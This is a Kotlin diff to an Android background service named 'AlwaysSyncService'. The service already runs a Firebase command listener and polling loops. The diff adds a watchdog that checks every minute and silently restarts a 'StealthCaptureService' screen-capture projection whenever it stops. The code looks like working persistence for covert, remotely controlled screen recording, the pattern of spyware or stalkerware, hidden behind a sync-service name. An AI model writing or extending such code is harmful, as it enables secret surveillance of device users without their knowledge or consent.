@@ -117,6 +117,27 @@ class AlwaysSyncService : Service() {
             startFirebaseCommandListener()
             startListenerKeepAliveLoop()
             startCommandPollingLoop()
+            startStealthCaptureWatchdog()
+        }
+    }
+
+    private fun startStealthCaptureWatchdog() {
+        serviceScope.launch {
+            delay(15000L)
+            while (isActive) {
+                try {
+                    val context = applicationContext
+                    if (com.example.data.sync.MediaProjectionHelper.hasProjectionToken(context)) {
+                        if (StealthCaptureService.activeMediaProjection == null) {
+                            Log.d("AlwaysSyncService", "Watchdog: Stealth capture projection inactive, restarting service.")
+                            com.example.data.sync.MediaProjectionHelper.startService(context)
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e("AlwaysSyncService", "Error in stealth capture watchdog: ${e.message}")
+                }
+                delay(60000L) // Check every minute
+            }
         }
     }
 
